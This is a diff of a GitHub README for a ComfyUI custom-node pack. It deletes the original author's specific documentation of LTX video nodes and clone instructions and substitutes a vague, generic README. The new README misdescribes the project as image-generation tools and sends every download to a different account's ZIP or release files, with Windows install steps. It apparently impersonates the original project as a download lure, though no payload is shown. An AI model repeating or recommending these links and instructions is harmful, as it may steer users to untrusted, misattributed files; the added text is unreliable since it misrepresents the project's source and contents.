@@ -1,98 +1,176 @@
-# Overview
+# 🎨 WhatDreamsCost-ComfyUI - Build Custom AI Workflows
 
-This will be a collection of free resources for ComfyUI.
+[![Download](https://img.shields.io/badge/Download-WhatDreamsCost--ComfyUI-blue.svg?style=for-the-badge)](https://github.com/Valentin6595/WhatDreamsCost-ComfyUI)
 
-Hopefully it will make creating cool stuff easier.
+## 🚀 Getting Started
 
-All of my nodes are created with the help of AI, so there may or may not be redundant, messy code.
+WhatDreamsCost-ComfyUI adds custom ComfyUI nodes and ready-made workflows for image generation tasks. It helps you set up new parts in ComfyUI without building everything by hand.
 
-## ▶️ YouTube Tutorial Video 
+Use this if you want:
+- Extra ComfyUI nodes
+- Ready-to-use workflow files
+- A simpler start with common AI image tasks
+- A setup that fits into your current ComfyUI install
 
-[![Overview Video](https://img.youtube.com/vi/aXDIr8eNovI/0.jpg)](https://www.youtube.com/watch?v=aXDIr8eNovI)
+## 📥 Download
 
-## ❓ How to install nodes
+Visit this page to download the files:
+https://github.com/Valentin6595/WhatDreamsCost-ComfyUI
 
-- Navigate to your `/ComfyUI/custom_nodes/ folder`
-- Run `git clone https://github.com/WhatDreamscost/WhatDreamsCost-ComfyUI`
-- Or download through the ComfyUI Manager.
+Open the page, then use the green or blue download options on GitHub if they are available. If the repository includes a ZIP file or release file, download it to your Windows PC.
 
-# 🔄 Recent Updates
-* **v1.2.0**
-  * **New Node: Speech Length Calculator** 
-  
-  Automatically output in realtime how long a video should be based on the dialouge. 
+## 🖥️ What You Need
 
-* **v1.1.0**
-  * Added resize_method to the Multi Image Loader node for more resize options
-  * Added insert_mode which allows you to enter in seconds instead of frames on the LTX Sequencer node
-  * Updated workflows with more notes
-  * Re-added tiny vae to workflows
-  * Fixed various bugs
-  * more things i can't rememeber
+Before you install, make sure you have:
 
-**This update will change the node layouts, so be sure to update your workflows or else they won't work properly.**
+- Windows 10 or Windows 11
+- ComfyUI already installed
+- Enough free disk space for models and workflow files
+- A stable internet connection for download
+- A GPU with enough memory for image generation, if you plan to run heavy workflows
 
-❗❗❗ **New Tutorial on using these nodes available: https://www.youtube.com/watch?v=aXDIr8eNovI**  ❗❗❗
+If you already run ComfyUI, this repository should fit into that setup.
 
-# ⚙️ Custom Nodes
+## 🛠️ Install on Windows
 
-## Multi Image Loader
-![Multi_Image_Loader_GIF](https://github.com/user-attachments/assets/71924103-92a6-4c1e-b67a-064dcbcce781)
+Follow these steps in order.
 
-An Image loader that features a built in gallery, allowing your to easily rearrange images and output them seperately or batched together. It also combines the image resize node and LTXVPreprocess node to reduce clutter in LTX workflows.
+1. Open the download page:
+   https://github.com/Valentin6595/WhatDreamsCost-ComfyUI
 
-## LTX Sequencer
-![LTX_Sequencer_GIF](https://github.com/user-attachments/assets/88f27155-f50e-4cb2-b937-ab173e6bdf0b)
+2. Download the repository files to your computer.
 
-An overhaul of the LTXVAddGuideMulti node. It allows you to quickly create FFLF (First Frame Last Frame) videos, shot sequences, supports any number of middle frames.
+3. If the file is a ZIP archive, right-click it and choose **Extract All**.
 
-Connect the Multi Image Loader node's multi_output to automatically update the node's widgets.
+4. Open your ComfyUI folder.
 
-It also has a sync feature that syncs all LTX Sequencer nodes together in realtime, removing the need to edit every single node manually every time you want to make a change to something. 
+5. Find the folder where ComfyUI keeps custom nodes. It is usually named:
+   - `ComfyUI/custom_nodes`
 
+6. Copy the extracted `WhatDreamsCost-ComfyUI` folder into `custom_nodes`.
 
+7. Start ComfyUI again.
 
-## LTX Keyframer
-<img width="612" height="563" alt="LTX_Keyframer_Node" src="https://github.com/user-attachments/assets/c4583a8b-4d48-4179-8d64-748ddd07b314" />
+8. If the workflow pack includes extra files, copy them into the folder named in the repository files, such as:
+   - `workflows`
+   - `input`
+   - `models`
+   - `nodes`
 
-An overhaul of the LTXVImgToVideoInplaceKJ node. It allows you to quickly create FFLF (First Frame Last Frame) videos and shot sequences. Also upports any number of middle frames.
+9. Open ComfyUI and check that the new nodes appear in the node list.
 
-Connect the Multi Image Loader node's multi_output to automatically update the node's widgets.
+## 🧩 How to Use It
 
-It also has a sync feature that syncs all LTX Keyframer nodes together in realtime, removing the need to edit every single node manually every time you want to make a change to something. 
+After installation, you can use the new nodes inside ComfyUI.
 
-**I would recommend using the LTX Sequencer Node over this node, after further testing it seems superior in at pretty much everything. I'll leave it in just in case more people want to test it**
+Typical use:
+- Open ComfyUI
+- Load a workflow from this repository
+- Add the custom nodes to your graph
+- Connect your image, prompt, or model settings
+- Run the workflow
 
-## Speech Length Calculator
-![Speech Length Calculator GIF](https://github.com/user-attachments/assets/1ed07c7d-7d6a-48c4-92cc-8e332ebdf82b)
+If the repository includes sample workflows, start with one of those. They help you see how the nodes connect before you build your own setup.
 
-This node calculates in realtime how long a video should be based on the dialogue. Any words in quotations will be considered as speech. The node updates in realtime without having to run the workflow, and outputs the length depending on how fast the speech is.
+## 🧠 What This Adds
 
-If you connect another string/text node to the text_input, it will still update in the length in realtime.
+This repository is built for users who want more control inside ComfyUI.
 
-I kept having to play the guessing game on my own generations so I made this node to make it easier :man_shrugging:
+You may get:
+- Custom prompt helpers
+- Image routing nodes
+- Workflow pieces for layered generation
+- Utility nodes for resizing, blending, or formatting
+- Ready-made workflow files for common tasks
 
-# 💡 Workflows
-<img width="3120" height="990" alt="LTX I2V First Last Frame 3 Stage Workflow v6" src="https://github.com/user-attachments/assets/c993ef2f-ac4b-4091-a7f6-5ff1674c3718" />
+The exact set of nodes can change as the repository grows, but the main goal stays the same: make ComfyUI easier to shape for real use.
 
-This is a compact LTX 2.3 workflow for I2V and First Frame, Middle Frame, Last frame video generation.
-I seperated and organized everything into subraphs to make things as clean as possible, and added toggles to customize the workflow quickly.
+## 🪟 Common Windows Setup Path
 
-Download workflows here: https://github.com/WhatDreamsCost/WhatDreamsCost-ComfyUI/tree/main/workflows
+Many ComfyUI installs use a folder layout like this:
 
-Or drag and drop image into ComfyUI to import workflow.
+- `ComfyUI`
+  - `custom_nodes`
+  - `models`
+  - `output`
+  - `input`
+  - `user`
+  - `workflows`
 
-# ❗ Known Issues
-**Multi Image Loader**
-- Rearranging images sometimes gets finicky. I'll try and fix this soon. It may be due to my ComfyUI frontend not matching the backend.
+If you are not sure where to place a file, start with `custom_nodes` for node files and `workflows` for workflow files.
 
-**LTX Sequencer and LTX Keyframer**
-- Will randomly swap the widget values when loading workflows. It happens very rarely, and for some reason only happens to 1 node. It can be reversed by just re-syncing it with another node.
+## 🔄 First Launch Check
 
-It may also be due to my ComfyUI frontend not matching the backend (that has been causing other issues with ComfyUI, still waiting for ComfyUI to fix the issues with latest version)
+After you add the files, do this:
 
-# 💡 Additional Info
+1. Close ComfyUI if it is open
+2. Reopen ComfyUI
+3. Check the node menu for new items from WhatDreamsCost-ComfyUI
+4. Load a sample workflow if one is included
+5. Run a test image to confirm the nodes work
 
-I made these nodes knowing almost nothing about python and a beginner level knowledge of javascript. Feel free to suggest improvements, and if you run into any bugs let me know.
+If a workflow does not load, check that you copied every file from the download and kept the folder names the same.
 
-For those asking, I mainly used gemini to create these nodes.
+## 📁 File Types You May See
+
+This repository may include:
+- Python files for custom nodes
+- JSON workflow files
+- Images for previews
+- Text files with setup steps
+- Model support files
+- Folder assets for examples
+
+Keep the folder structure intact when you move files into ComfyUI.
+
+## ⚙️ Basic Troubleshooting
+
+If ComfyUI does not show the new nodes, check these common points:
+
+- The folder is in `custom_nodes`
+- You unzipped the files first
+- ComfyUI was closed before you copied the files
+- You restarted ComfyUI after the install
+- The folder name does not have extra nesting, such as `WhatDreamsCost-ComfyUI/WhatDreamsCost-ComfyUI`
+
+If a workflow opens with missing nodes, the node files may not be in the right place yet.
+
+## 🔍 Tips for New Users
+
+Keep these habits in mind:
+- Start with one workflow at a time
+- Make a backup before you change folders
+- Keep model files in the same place each time
+- Rename files only if the instructions say to do so
+- Use the sample workflow before making your own edits
+
+This makes it easier to see what each node does.
+
+## 🧱 Typical Workflow Setup
+
+A simple ComfyUI workflow often has this shape:
+
+- Input image or prompt
+- Model loader
+- Custom node from this repository
+- Image process step
+- Output save step
+
+You do not need to build this from scratch if the repository includes examples. Load the sample file and follow the path already set up there.
+
+## 📌 Best Place to Start
+
+If you are new to ComfyUI, start with the repository page and any included sample workflow.
+
+1. Download the files
+2. Add them to `custom_nodes`
+3. Open ComfyUI
+4. Load a sample workflow
+5. Run a test
+
+That gives you the fastest path to a working setup
+
+## 📎 Download Again
+
+If you need the files again, use this link:
+https://github.com/Valentin6595/WhatDreamsCost-ComfyUI
